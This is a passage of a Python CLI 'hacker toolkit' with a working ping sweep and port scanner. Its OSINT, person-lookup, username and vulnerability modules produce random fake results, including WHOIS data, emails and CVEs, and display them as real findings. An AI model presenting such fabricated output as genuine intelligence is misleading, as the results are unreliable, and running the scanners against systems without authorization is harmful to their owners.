#!/usr/bin/env python3
"""
Python Hacker Toolkit
--------------------------------------------------
A comprehensive, interactive CLI tool designed for ethical hacking
and penetration testing. This toolkit leverages Rich and Pyfiglet
to provide an intuitive, visually appealing, and modular user interface.

Features:
  • Network Scanning (Ping Sweep, Port Scan, Full Scan)
  • OSINT Gathering (Domain & Person Intelligence)
  • Username Enumeration across multiple platforms
  • Service Enumeration with simulated banners and vulnerabilities
  • Payload Generation for various target platforms
  • Exploit Modules with simulated exploitation
  • Credential Dumping (Database, Windows, Linux, Web)
  • Privilege Escalation Assessment
  • Report Generation (Markdown formatted)
  • Settings and API key management
  • Log Viewing and Help/Documentation

Version: 1.0.0
"""

import atexit
import datetime
import hashlib
import ipaddress
import json
import logging
import os
import random
import re
import signal
import socket
import subprocess
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

import requests
import pyfiglet
from rich.align import Align
from rich.console import Console
from rich.markdown import Markdown
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeRemainingColumn,
)
from rich.prompt import Confirm, IntPrompt, Prompt
from rich.syntax import Syntax
from rich.table import Table
from rich.text import Text
from rich.traceback import install as install_rich_traceback

# ----------------------------------------------------------------
# Setup Rich and Logging
# ----------------------------------------------------------------
install_rich_traceback(show_locals=True)
console = Console()


# ----------------------------------------------------------------
# Nord-Themed Colors
# ----------------------------------------------------------------
class NordColors:
    POLAR_NIGHT_1 = "#2E3440"
    POLAR_NIGHT_2 = "#3B4252"
    POLAR_NIGHT_3 = "#434C5E"
    POLAR_NIGHT_4 = "#4C566A"
    SNOW_STORM_1 = "#D8DEE9"
    SNOW_STORM_2 = "#E5E9F0"
    SNOW_STORM_3 = "#ECEFF4"
    FROST_1 = "#8FBCBB"
    FROST_2 = "#88C0D0"
    FROST_3 = "#81A1C1"
    FROST_4 = "#5E81AC"
    RED = "#BF616A"
    ORANGE = "#D08770"
    YELLOW = "#EBCB8B"
    GREEN = "#A3BE8C"
    PURPLE = "#B48EAD"
    # Module-specific colors
    RECONNAISSANCE = FROST_1
    ENUMERATION = FROST_2
    EXPLOITATION = RED
    POST_EXPLOITATION = ORANGE
    REPORTING = GREEN
    UTILITIES = PURPLE


# ----------------------------------------------------------------
# Application Configuration & Constants
# ----------------------------------------------------------------
class AppConfig:
    VERSION = "1.0.0"
    APP_NAME = "Python Hacker Toolkit"
    APP_SUBTITLE = "Ethical Hacking & Penetration Testing Suite"
    HOSTNAME = socket.gethostname()
    BASE_DIR = Path.home() / ".pht"
    LOG_DIR = BASE_DIR / "logs"
    RESULTS_DIR = BASE_DIR / "results"
    PAYLOADS_DIR = BASE_DIR / "payloads"
    CONFIG_DIR = BASE_DIR / "config"
    DEFAULT_THREADS = 10
    DEFAULT_TIMEOUT = 30  # seconds
    MAX_LOG_SIZE = 10 * 1024 * 1024  # 10 MB
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Firefox/90.0",
    ]
    DEFAULT_NMAP_OPTIONS = ["-sV", "-sS", "-A", "--top-ports", "1000"]


# Ensure required directories exist
for d in [
    AppConfig.LOG_DIR,
    AppConfig.RESULTS_DIR,
    AppConfig.PAYLOADS_DIR,
    AppConfig.CONFIG_DIR,
]:
    d.mkdir(parents=True, exist_ok=True)


# ----------------------------------------------------------------
# Logging Setup
# ----------------------------------------------------------------
class LogLevel(Enum):
    INFO = (NordColors.FROST_2, "INFO")
    WARNING = (NordColors.YELLOW, "WARNING")
    ERROR = (NordColors.RED, "ERROR")
    SUCCESS = (NordColors.GREEN, "SUCCESS")
    DEBUG = (NordColors.PURPLE, "DEBUG")


def rotate_logs() -> None:
    log_files = list(AppConfig.LOG_DIR.glob("*.log"))
    log_files.sort(key=lambda f: f.stat().st_mtime)
    total_size = sum(f.stat().st_size for f in log_files)
    while total_size > AppConfig.MAX_LOG_SIZE and log_files:
        oldest = log_files.pop(0)
        total_size -= oldest.stat().st_size
        oldest.unlink()


def setup_logging() -> logging.Logger:
    rotate_logs()
    log_file = (
        AppConfig.LOG_DIR
        / f"pht_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    )
    logger = logging.getLogger("pht")
    logger.setLevel(logging.DEBUG)
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)
    formatter = logging.Formatter(
        "%(asctime)s - %(levelname)s - %(message)s", "%Y-%m-%d %H:%M:%S"
    )
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
    return logger


logger = setup_logging()


def log_message(level: LogLevel, message: str) -> None:
    color, lvl = level.value
    console.print(f"[{color}][{lvl}][/] {message}")
    if level == LogLevel.DEBUG:
        logger.debug(message)
    elif level == LogLevel.INFO:
        logger.info(message)
    elif level == LogLevel.WARNING:
        logger.warning(message)
    elif level == LogLevel.ERROR:
        logger.error(message)
    elif level == LogLevel.SUCCESS:
        logger.info(f"SUCCESS: {message}")


# ----------------------------------------------------------------
# Helper Functions
# ----------------------------------------------------------------
def create_header() -> Panel:
    fonts = ["digital", "slant", "doom", "big", "banner3"]
    ascii_art = ""
    for font in fonts:
        try:
            fig = pyfiglet.Figlet(font=font, width=80)
            ascii_art = fig.renderText(AppConfig.APP_NAME)
            if ascii_art.strip():
                break
        except Exception:
            continue
    if not ascii_art.strip():
        ascii_art = AppConfig.APP_NAME
    # Create gradient effect using Nord colors
    lines = ascii_art.splitlines()
    styled_lines = ""
    gradient = [NordColors.RED, NordColors.ORANGE, NordColors.PURPLE]
    for i, line in enumerate(lines):
        color = gradient[i % len(gradient)]
        styled_lines += f"[bold {color}]{line}[/]\n"
    border = f"[{NordColors.FROST_3}]" + "=" * 80 + "[/]"
    content = f"{border}\n{styled_lines}{border}"
    return Panel(
        Text.from_markup(content),
        border_style=NordColors.FROST_1,
        title=f"[bold {NordColors.SNOW_STORM_2}]v{AppConfig.VERSION}[/]",
        subtitle=f"[bold {NordColors.SNOW_STORM_1}]{AppConfig.APP_SUBTITLE}[/]",
        subtitle_align="center",
    )


def display_panel(
    message: str, style: str = NordColors.FROST_2, title: Optional[str] = None
) -> None:
    panel = Panel(
        Text.from_markup(f"[bold {style}]{message}[/]"),
        border_style=style,
        padding=(1, 2),
        title=f"[bold {style}]{title}[/]" if title else None,
    )
    console.print(panel)


def get_user_input(prompt_text: str, password: bool = False) -> str:
    try:
        return Prompt.ask(
            f"[bold {NordColors.FROST_2}]{prompt_text}[/]", password=password
        )
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Input cancelled by user[/]")
        return ""


def get_confirmation(prompt_text: str) -> bool:
    try:
        return Confirm.ask(f"[bold {NordColors.FROST_2}]{prompt_text}[/]")
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Confirmation cancelled by user[/]")
        return False


def get_integer_input(
    prompt_text: str, min_value: int = None, max_value: int = None
) -> int:
    try:
        return IntPrompt.ask(
            f"[bold {NordColors.FROST_2}]{prompt_text}[/]",
            min_value=min_value,
            max_value=max_value,
        )
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Input cancelled by user[/]")
        return -1


def display_progress(
    total: int, description: str, color: str = NordColors.FROST_2
) -> (Progress, int):
    progress = Progress(
        SpinnerColumn("dots", style=f"bold {color}"),
        TextColumn(f"[bold {color}]{description}"),
        BarColumn(bar_width=40, style=NordColors.FROST_4, complete_style=color),
        TextColumn(
            "[bold {0}]{{task.percentage:>3.0f}}%".format(NordColors.SNOW_STORM_1)
        ),
        TimeRemainingColumn(),
        console=console,
    )
    progress.start()
    task = progress.add_task(description, total=total)
    return progress, task


def run_command(
    cmd: List[str],
    env: Optional[Dict[str, str]] = None,
    check: bool = True,
    capture_output: bool = True,
    timeout: int = AppConfig.DEFAULT_TIMEOUT,
) -> subprocess.CompletedProcess:
    log_message(LogLevel.DEBUG, f"Executing: {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd,
            env=env or os.environ.copy(),
            check=check,
            text=True,
            capture_output=capture_output,
            timeout=timeout,
        )
        return result
    except subprocess.CalledProcessError as e:
        log_message(LogLevel.ERROR, f"Command failed: {' '.join(cmd)}")
        if e.stdout:
            console.print(f"[dim]Stdout: {e.stdout.strip()}[/dim]")
        if e.stderr:
            console.print(f"[bold {NordColors.RED}]Stderr: {e.stderr.strip()}[/]")
        raise
    except subprocess.TimeoutExpired:
        log_message(LogLevel.ERROR, f"Command timed out after {timeout} seconds")
        raise
    except Exception as e:
        log_message(LogLevel.ERROR, f"Error executing command: {e}")
        raise


# ----------------------------------------------------------------
# Data Structures
# ----------------------------------------------------------------
@dataclass
class ScanResult:
    target: str
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)
    port_data: Dict[int, Dict[str, str]] = field(default_factory=dict)
    os_info: Optional[str] = None
    vulnerabilities: List[Dict[str, str]] = field(default_factory=list)


@dataclass
class OSINTResult:
    target: str
    source_type: str
    data: Dict[str, Any]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class UsernameResult:
    username: str
    platforms: Dict[str, bool]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class ServiceResult:
    service_name: str
    version: Optional[str]
    host: str
    port: int
    details: Dict[str, Any]
    potential_vulns: List[Dict[str, str]]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class Payload:
    name: str
    payload_type: str
    target_platform: str
    content: str
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class Exploit:
    name: str
    cve: Optional[str]
    target_service: str
    description: str
    severity: str
    payload: Optional[Payload] = None


@dataclass
class CredentialDump:
    source: str
    credentials: List[Dict[str, str]]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class PrivilegeEscalation:
    target: str
    method: str
    details: Dict[str, Any]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class Report:
    title: str
    target: str
    sections: Dict[str, str]
    findings: List[Dict[str, str]]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)

    def to_markdown(self) -> str:
        md = f"# {self.title}\n\n"
        md += f"**Target:** {self.target}  \n"
        md += f"**Date:** {self.timestamp.strftime('%Y-%m-%d %H:%M:%S')}  \n\n"
        md += "## Key Findings\n\n"
        for i, finding in enumerate(self.findings, 1):
            md += f"### {i}. {finding.get('title', 'Untitled')}\n\n"
            md += f"**Severity:** {finding.get('severity', 'Unknown')}\n\n"
            md += f"{finding.get('description', 'No description provided.')}\n\n"
        for section, content in self.sections.items():
            md += f"## {section}\n\n{content}\n\n"
        return md


# ----------------------------------------------------------------
# Module Functions
# ----------------------------------------------------------------
def network_scanning_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Discover active hosts, open ports and services.",
        NordColors.RECONNAISSANCE,
        "Network Scanning",
    )

    # Sub-menu for scanning
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Ping Sweep (Discover live hosts)")
    table.add_row("2", "Port Scan (Identify open ports)")
    table.add_row("3", "Full Network Scan (Comprehensive)")
    table.add_row("0", "Return to Main Menu")
    console.print(table)

    choice = get_integer_input("Select an option:", 0, 3)
    if choice == 0:
        return
    elif choice == 1:
        target = get_user_input("Enter target subnet (e.g., 192.168.1.0/24):")
        if not target:
            return
        live_hosts = []
        try:
            network = ipaddress.ip_network(target, strict=False)
            hosts = list(network.hosts())
            # Limit number for demo purposes
            hosts = hosts[: min(len(hosts), 100)]
            progress, task = display_progress(
                len(hosts), "Pinging hosts", NordColors.RECONNAISSANCE
            )
            with progress:

                def check_host(ip):
                    try:
                        cmd = (
                            ["ping", "-n", "1", "-w", "500", str(ip)]
                            if sys.platform == "win32"
                            else ["ping", "-c", "1", "-W", "1", str(ip)]
                        )
                        if (
                            subprocess.run(
                                cmd,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                timeout=1,
                            ).returncode
                            == 0
                        ):
                            live_hosts.append(str(ip))
                    finally:
                        progress.update(task, advance=1)

                with ThreadPoolExecutor(
                    max_workers=AppConfig.DEFAULT_THREADS
                ) as executor:
                    executor.map(check_host, hosts)
            progress.stop()
            if live_hosts:
                display_panel(
                    f"Found {len(live_hosts)} active hosts",
                    NordColors.GREEN,
                    "Scan Complete",
                )
                host_table = Table(
                    title="Active Hosts",
                    show_header=True,
                    header_style=f"bold {NordColors.FROST_1}",
                )
                host_table.add_column("IP Address", style=f"bold {NordColors.FROST_2}")
                host_table.add_column("Status", style=NordColors.GREEN)
                for ip in live_hosts:
                    host_table.add_row(ip, "● ACTIVE")
                console.print(host_table)
            else:
                display_panel("No active hosts found.", NordColors.RED, "Scan Complete")
        except Exception as e:
            log_message(LogLevel.ERROR, f"Ping scan error: {e}")
        input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
    elif choice == 2:
        target = get_user_input("Enter target IP:")
        if not target:
            return
        open_ports = {}
        ports = [
            21,
            22,
            23,
            25,
            53,
            80,
            110,
            111,
            135,
            139,
            143,
            443,
            445,
            993,
            995,
            1723,
            3306,
            3389,
            5900,
            8080,
        ]
        progress, task = display_progress(
            len(ports), "Scanning ports", NordColors.RECONNAISSANCE
        )
        with progress:
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    if s.connect_ex((target, port)) == 0:
                        service = (
                            socket.getservbyport(port) if port < 1024 else "unknown"
                        )
                        open_ports[port] = {"service": service, "state": "open"}
                    s.close()
                except Exception:
                    pass
                finally:
                    progress.update(task, advance=1)
        progress.stop()
        if open_ports:
            display_panel(
                f"Found {len(open_ports)} open ports on {target}",
                NordColors.GREEN,
                "Scan Complete",
            )
            port_table = Table(
                title="Open Ports",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            port_table.add_column("Port", style=f"bold {NordColors.FROST_2}")
            port_table.add_column("Service", style=NordColors.SNOW_STORM_1)
            port_table.add_column("State", style=NordColors.GREEN)
            for port, info in open_ports.items():
                port_table.add_row(
                    str(port),
                    info.get("service", "unknown"),
                    info.get("state", "unknown"),
                )
            console.print(port_table)
        else:
            display_panel(
                f"No open ports found on {target}", NordColors.YELLOW, "Scan Complete"
            )
        input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
    elif choice == 3:
        target = get_user_input("Enter target IP or hostname:")
        if not target:
            return
        # Simulate a full scan by combining port scan and dummy OS detection/vulns
        scan_result = ScanResult(target=target, port_data=port_scan(target))
        # Simulated OS detection and vulnerabilities
        scan_result.os_info = random.choice(
            ["Ubuntu 20.04 LTS", "Windows Server 2019", "Debian 11", "macOS 11.6", None]
        )
        known_vulns = {
            21: {"name": "FTP Anonymous Access", "cve": "CVE-1999-0497"},
            22: {"name": "OpenSSH User Enumeration", "cve": "CVE-2018-15473"},
            80: {"name": "Apache Mod_CGI RCE", "cve": "CVE-2021-44790"},
            443: {"name": "OpenSSL Heartbleed", "cve": "CVE-2014-0160"},
            3306: {"name": "MySQL Auth Bypass", "cve": "CVE-2012-2122"},
            3389: {"name": "Microsoft RDP BlueKeep", "cve": "CVE-2019-0708"},
        }
        for port in scan_result.port_data:
            if port in known_vulns and random.random() < 0.7:
                scan_result.vulnerabilities.append(known_vulns[port])
        display_scan_result(scan_result)
        if get_confirmation("Save these results to file?"):
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"scan_{target.replace('.', '_')}_{timestamp}.json"
            filepath = AppConfig.RESULTS_DIR / filename
            result_dict = {
                "target": scan_result.target,
                "timestamp": scan_result.timestamp.isoformat(),
                "port_data": scan_result.port_data,
                "os_info": scan_result.os_info,
                "vulnerabilities": scan_result.vulnerabilities,
            }
            with open(filepath, "w") as f:
                json.dump(result_dict, f, indent=2)
            log_message(LogLevel.SUCCESS, f"Results saved to {filepath}")
        input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def port_scan(target: str) -> Dict[int, Dict[str, str]]:
    """Helper function for port scanning used in full scan."""
    open_ports = {}
    ports = [
        21,
        22,
        23,
        25,
        53,
        80,
        110,
        111,
        135,
        139,
        143,
        443,
        445,
        993,
        995,
        1723,
        3306,
        3389,
        5900,
        8080,
    ]
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((target, port)) == 0:
                service = socket.getservbyport(port) if port < 1024 else "unknown"
                open_ports[port] = {"service": service, "state": "open"}
            s.close()
        except Exception:
            pass
    return open_ports


def display_scan_result(result: ScanResult) -> None:
    console.print()
    scan_panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Target:[/] {result.target}\n"
            f"[bold {NordColors.FROST_2}]Scan Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"[bold {NordColors.FROST_2}]OS Detected:[/] {result.os_info or 'Unknown'}\n"
        ),
        title=f"Scan Results for {result.target}",
        border_style=NordColors.RECONNAISSANCE,
    )
    console.print(scan_panel)
    if result.port_data:
        table = Table(
            title="Open Ports & Services",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Port", style=f"bold {NordColors.FROST_2}", justify="right")
        table.add_column("Service", style=NordColors.SNOW_STORM_1)
        table.add_column("State", style=NordColors.GREEN)
        for port, info in result.port_data.items():
            table.add_row(
                str(port), info.get("service", "unknown"), info.get("state", "unknown")
            )
        console.print(table)
    else:
        console.print(f"[{NordColors.YELLOW}]No open ports found.[/]")
    if result.vulnerabilities:
        vuln_table = Table(
            title="Potential Vulnerabilities",
            show_header=True,
            header_style=f"bold {NordColors.RED}",
            border_style=NordColors.RED,
        )
        vuln_table.add_column("Vulnerability", style=f"bold {NordColors.SNOW_STORM_1}")
        vuln_table.add_column("CVE", style=NordColors.YELLOW)
        for vuln in result.vulnerabilities:
            vuln_table.add_row(vuln.get("name", "Unknown"), vuln.get("cve", "N/A"))
        console.print(vuln_table)
    else:
        console.print(f"[{NordColors.GREEN}]No obvious vulnerabilities detected.[/]")


def osint_gathering_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Collect publicly available intelligence on targets.",
        NordColors.RECONNAISSANCE,
        "OSINT Gathering",
    )
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Domain Intelligence")
    table.add_row("2", "Person OSINT")
    table.add_row("0", "Return to Main Menu")
    console.print(table)
    choice = get_integer_input("Select an option:", 0, 2)
    if choice == 0:
        return
    elif choice == 1:
        domain = get_user_input("Enter target domain (e.g., example.com):")
        if not domain:
            return
        with console.status(
            f"[bold {NordColors.FROST_2}]Gathering intelligence on {domain}..."
        ):
            time.sleep(1.5)
            result = gather_domain_info(domain)
        display_osint_result(result)
        if get_confirmation("Save these results to file?"):
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"osint_domain_{domain.replace('.', '_')}_{timestamp}.json"
            filepath = AppConfig.RESULTS_DIR / filename
            result_dict = {
                "target": result.target,
                "source_type": result.source_type,
                "timestamp": result.timestamp.isoformat(),
                "data": result.data,
            }
            with open(filepath, "w") as f:
                json.dump(result_dict, f, indent=2)
            log_message(LogLevel.SUCCESS, f"Results saved to {filepath}")
        input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
    elif choice == 2:
        name = get_user_input("Enter target person's name:")
        if not name:
            return
        with console.status(
            f"[bold {NordColors.FROST_2}]Gathering intelligence on {name}..."
        ):
            time.sleep(1.5)
            result = gather_person_info(name)
        display_osint_result(result)
        if get_confirmation("Save these results to file?"):
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"osint_person_{name.replace(' ', '_')}_{timestamp}.json"
            filepath = AppConfig.RESULTS_DIR / filename
            result_dict = {
                "target": result.target,
                "source_type": result.source_type,
                "timestamp": result.timestamp.isoformat(),
                "data": result.data,
            }
            with open(filepath, "w") as f:
                json.dump(result_dict, f, indent=2)
            log_message(LogLevel.SUCCESS, f"Results saved to {filepath}")
        input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def gather_domain_info(domain: str) -> OSINTResult:
    data = {}
    try:
        data["whois"] = {
            "registrar": "Example Registrar, Inc.",
            "creation_date": f"{random.randint(1995, 2020)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "expiration_date": f"{random.randint(2023, 2030)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "status": random.choice(
                [
                    "clientTransferProhibited",
                    "clientDeleteProhibited",
                    "clientUpdateProhibited",
                ]
            ),
            "name_servers": [f"ns{i}.cloudflare.com" for i in range(1, 3)],
        }
        data["dns"] = {
            "a_records": [
                f"192.0.2.{random.randint(1, 255)}" for _ in range(random.randint(1, 3))
            ],
            "mx_records": [f"mail{i}.{domain}" for i in range(1, random.randint(2, 4))],
            "txt_records": [f"v=spf1 include:_spf.{domain} ~all"],
            "ns_records": data["whois"]["name_servers"],
        }
        data["ssl"] = {
            "issuer": random.choice(
                ["Let's Encrypt Authority X3", "DigiCert Inc", "Sectigo Limited"]
            ),
            "valid_from": f"{random.randint(2021, 2022)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "valid_to": f"{random.randint(2023, 2024)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "serial_number": str(random.randint(1000000000, 9999999999)),
        }
        data["subdomains"] = [f"www.{domain}", f"mail.{domain}", f"api.{domain}"]
    except Exception as e:
        log_message(LogLevel.ERROR, f"Error gathering domain info: {e}")
    return OSINTResult(target=domain, source_type="domain_analysis", data=data)


def gather_person_info(name: str) -> OSINTResult:
    data = {}
    try:
        platforms = ["LinkedIn", "Twitter", "Facebook", "Instagram", "GitHub", "Reddit"]
        data["social_media"] = {}
        for platform in platforms:
            if random.random() < 0.7:
                username = f"{name.lower().replace(' ', '')}{random.randint(0, 99)}"
                data["social_media"][platform] = {
                    "username": username,
                    "profile_url": f"https://{platform.lower()}.com/{username}",
                    "last_active": "recently",
                }
        domains = ["gmail.com", "outlook.com", "yahoo.com"]
        first, *rest = name.lower().split()
        last = "".join(rest) if rest else ""
        data["email_addresses"] = [f"{first}.{last}@{random.choice(domains)}"]
        companies = ["Acme Corp", "Tech Innovations", "Global Solutions"]
        job_titles = ["Software Engineer", "Data Analyst", "Project Manager"]
        data["professional_info"] = {
            "current_company": random.choice(companies),
            "job_title": random.choice(job_titles),
            "previous_companies": random.sample(companies, k=random.randint(0, 2)),
        }
    except Exception as e:
        log_message(LogLevel.ERROR, f"Error gathering person info: {e}")
    return OSINTResult(target=name, source_type="person_analysis", data=data)


def display_osint_result(result: OSINTResult) -> None:
    console.print()
    title = (
        "Domain Intelligence Report"
        if result.source_type == "domain_analysis"
        else "Person Intelligence Report"
    )
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Target:[/] {result.target}\n"
            f"[bold {NordColors.FROST_2}]Analysis Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title=title,
        border_style=NordColors.RECONNAISSANCE,
    )
    console.print(panel)
    if result.source_type == "domain_analysis":
        whois = result.data.get("whois", {})
        if whois:
            table = Table(
                title="WHOIS Information",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            table.add_column("Property", style=f"bold {NordColors.FROST_2}")
            table.add_column("Value", style=NordColors.SNOW_STORM_1)
            for key, value in whois.items():
                if key == "name_servers":
                    value = ", ".join(value)
                table.add_row(key.replace("_", " ").title(), str(value))
            console.print(table)
        dns = result.data.get("dns", {})
        if dns:
            table = Table(
                title="DNS Records",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            table.add_column("Record Type", style=f"bold {NordColors.FROST_2}")
            table.add_column("Value", style=NordColors.SNOW_STORM_1)
            for rtype, values in dns.items():
                table.add_row(
                    rtype.upper(),
                    "\n".join(values) if isinstance(values, list) else str(values),
                )
            console.print(table)
        ssl = result.data.get("ssl", {})
        if ssl:
            table = Table(
                title="SSL Certificate",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            table.add_column("Property", style=f"bold {NordColors.FROST_2}")
            table.add_column("Value", style=NordColors.SNOW_STORM_1)
            for key, value in ssl.items():
                table.add_row(key.replace("_", " ").title(), str(value))
            console.print(table)
        subs = result.data.get("subdomains", [])
        if subs:
            table = Table(
                title="Subdomains",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            table.add_column("Subdomain", style=f"bold {NordColors.FROST_2}")
            for sub in subs:
                table.add_row(sub)
            console.print(table)
    else:
        social = result.data.get("social_media", {})
        if social:
            table = Table(
                title="Social Media Profiles",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            table.add_column("Platform", style=f"bold {NordColors.FROST_2}")
            table.add_column("Username", style=NordColors.SNOW_STORM_1)
            table.add_column("Profile URL", style=NordColors.FROST_3)
            for platform, info in social.items():
                table.add_row(
                    platform,
                    info.get("username", "N/A"),
                    info.get("profile_url", "N/A"),
                )
            console.print(table)
        emails = result.data.get("email_addresses", [])
        if emails:
            table = Table(
                title="Email Addresses",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            table.add_column("Email", style=f"bold {NordColors.FROST_2}")
            for email in emails:
                table.add_row(email)
            console.print(table)
        prof = result.data.get("professional_info", {})
        if prof:
            table = Table(
                title="Professional Information",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            table.add_column("Property", style=f"bold {NordColors.FROST_2}")
            table.add_column("Value", style=NordColors.SNOW_STORM_1)
            table.add_row("Current Company", prof.get("current_company", "Unknown"))
            table.add_row("Job Title", prof.get("job_title", "Unknown"))
            table.add_row(
                "Previous Companies",
                ", ".join(prof.get("previous_companies", ["None"])),
            )
            console.print(table)
    console.print()


def username_enumeration_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Search for a username across multiple platforms.",
        NordColors.ENUMERATION,
        "Username Enumeration",
    )
    username = get_user_input("Enter username to check:")
    if not username:
        return
    result = check_username(username)
    display_username_results(result)
    if get_confirmation("Save these results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"username_{username}_{timestamp}.json"
        filepath = AppConfig.RESULTS_DIR / filename
        result_dict = {
            "username": result.username,
            "timestamp": result.timestamp.isoformat(),
            "platforms": result.platforms,
        }
        with open(filepath, "w") as f:
            json.dump(result_dict, f, indent=2)
        log_message(LogLevel.SUCCESS, f"Results saved to {filepath}")
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def check_username(username: str) -> UsernameResult:
    platforms = {
        "Twitter": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "Reddit": f"https://reddit.com/user/{username}",
        "LinkedIn": f"https://linkedin.com/in/{username}",
    }
    results = {}
    progress, task = display_progress(
        len(platforms), "Checking platforms", NordColors.ENUMERATION
    )
    with progress:
        for platform, url in platforms.items():
            time.sleep(0.3)
            likelihood = 0.7 if len(username) < 6 else 0.4
            results[platform] = random.random() < likelihood
            progress.update(task, advance=1)
    progress.stop()
    return UsernameResult(username=username, platforms=results)


def display_username_results(result: UsernameResult) -> None:
    console.print()
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Username:[/] {result.username}\n"
            f"[bold {NordColors.FROST_2}]Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title="Username Enumeration Results",
        border_style=NordColors.ENUMERATION,
    )
    console.print(panel)
    table = Table(
        title="Platform Results",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Platform", style=f"bold {NordColors.FROST_2}")
    table.add_column("Status", style=NordColors.SNOW_STORM_1)
    table.add_column("URL", style=NordColors.FROST_3)
    found_count = 0
    for platform, found in result.platforms.items():
        if found:
            found_count += 1
            status = f"[bold {NordColors.GREEN}]● FOUND[/]"
            url = platforms_url = f"https://{platform.lower()}.com/{result.username}"
        else:
            status = f"[dim {NordColors.RED}]○ NOT FOUND[/]"
            url = "N/A"
        table.add_row(platform, status, url)
    console.print(table)
    if found_count > 0:
        console.print(
            f"[bold {NordColors.GREEN}]Username found on {found_count} platforms.[/]"
        )
    else:
        console.print(f"[bold {NordColors.RED}]Username not found on any platforms.[/]")
    console.print()


def service_enumeration_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Gather detailed information about a network service.",
        NordColors.ENUMERATION,
        "Service Enumeration",
    )
    host = get_user_input("Enter target host (IP or hostname):")
    if not host:
        return
    port = get_integer_input("Enter port number:", 1, 65535)
    service = get_user_input(
        "Enter service name (optional, leave blank to auto-detect):"
    )
    with console.status(
        f"[bold {NordColors.FROST_2}]Enumerating service on {host}:{port}..."
    ):
        time.sleep(2)
        result = enumerate_service(host, port, service if service else None)
    display_service_results(result)
    if get_confirmation("Save these results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"service_{host}_{port}_{timestamp}.json"
        filepath = AppConfig.RESULTS_DIR / filename
        result_dict = {
            "service_name": result.service_name,
            "version": result.version,
